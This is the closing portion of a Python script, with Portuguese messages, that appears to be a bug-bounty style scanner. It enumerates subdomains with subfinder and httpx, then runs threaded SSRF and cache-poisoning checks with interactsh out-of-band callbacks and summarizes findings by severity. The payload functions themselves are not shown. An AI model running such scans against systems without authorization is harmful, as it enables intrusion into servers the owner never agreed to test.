    if args.oob:
        info(f"OOB domain: {args.oob}")
        info(f"Certifique-se de rodar: interactsh-client -s {args.oob}")

    # ── Monta lista de hosts vivos ────────────────────────────────
    alive_hosts: list[dict] = []

    if args.target:
        alive_hosts = [{"url": args.target.strip(), "status": 0, "title": "", "tech": []}]

    elif args.alive:
        p = Path(args.alive)
        if not p.exists():
            err(f"Arquivo não encontrado: {p}")
            sys.exit(1)
        urls = [u.strip() for u in p.read_text().splitlines() if u.strip()]
        alive_hosts = [{"url": u, "status": 0, "title": "", "tech": []} for u in urls]
        ok(f"Carregadas {len(alive_hosts)} URLs de {p}")

    elif not args.skip_recon:
        if not shutil.which("subfinder") or not shutil.which("httpx"):
            err("subfinder e httpx são necessários para recon. Instale ou use --skip-recon --alive")
            sys.exit(1)

        print(f"\n{BO}{'═'*62}{RST}")
        print(f"{BO}Fase 1+2 — Recon: {args.domain}{RST}")
        print(f"{'═'*62}")

        subs = enumerate_subdomains(args.domain, odir, args.github_token, args.chaos_key)
        if not subs:
            err("Nenhum subdomínio encontrado")
            sys.exit(1)

        alive_hosts = validate_with_httpx(subs, odir, args.httpx_threads)

    if args.only_recon:
        ok("--only-recon: encerrando")
        sys.exit(0)

    if not alive_hosts:
        warn("Nenhum host vivo para escanear")
        sys.exit(0)

    # ── Scan por host ─────────────────────────────────────────────
    print(f"\n{BO}{'═'*62}{RST}")
    print(f"{BO}Iniciando scan — {len(alive_hosts)} host(s){RST}")
    print(f"{'═'*62}")

    all_findings: list[dict] = []

    def scan_host(host: dict):
        url = host["url"]
        raw_tech = host.get("tech", []) or []
        tech_str = ", ".join(raw_tech) if raw_tech else "—"
        cdn_info = f"  CDN:{host.get('cdn_name','')}" if host.get("cdn") else ""
        print(f"\n{BO}[>]{RST} {url}  {DIM}[{host['status']}] {host.get('title','')[:50]}  tech:{tech_str}{cdn_info}{RST}")

        local: list[dict] = []
        if not args.skip_ssrf:
            local += scan_ssrf(url, args.oob)
        if not args.skip_cache:
            local += scan_cache_poison(url, args.oob)

        if local:
            for i, f in enumerate(local, 1):
                print_finding(f, i)
        else:
            info(f"Sem findings em {url}")
        return local

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(scan_host, h): h for h in alive_hosts}
        for f in as_completed(futures):
            try:
                all_findings.extend(f.result())
            except Exception as e:
                err(f"Erro em {futures[f]['url']}: {e}")

    # ── Sumário ───────────────────────────────────────────────────
    print(f"\n{BO}{'═'*62}{RST}")
    print(f"{BO}SUMÁRIO{RST}")
    print(f"  Hosts escaneados : {len(alive_hosts)}")
    print(f"  Total findings   : {len(all_findings)}")

    by_conf: dict[str, int] = {}
    by_type: dict[str, int] = {}
    for f in all_findings:
        c = f["confidence"].split()[0]
        by_conf[c] = by_conf.get(c, 0) + 1
        by_type[f["type"]] = by_type.get(f["type"], 0) + 1

    for c in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if c in by_conf:
            col = {"CRITICAL": R, "HIGH": M, "MEDIUM": Y, "LOW": C}[c]
            print(f"  {col}{c}{RST}: {by_conf[c]}")

    if args.oob:
        oob_n = sum(1 for f in all_findings if "OOB" in f["type"])
        print(f"\n  OOB disparados: {oob_n} — confirme em: interactsh-client -s {args.oob}")

    if all_findings:
        save_report(all_findings, odir)
    print(f"{'═'*62}")


if __name__ == "__main__":
    main()
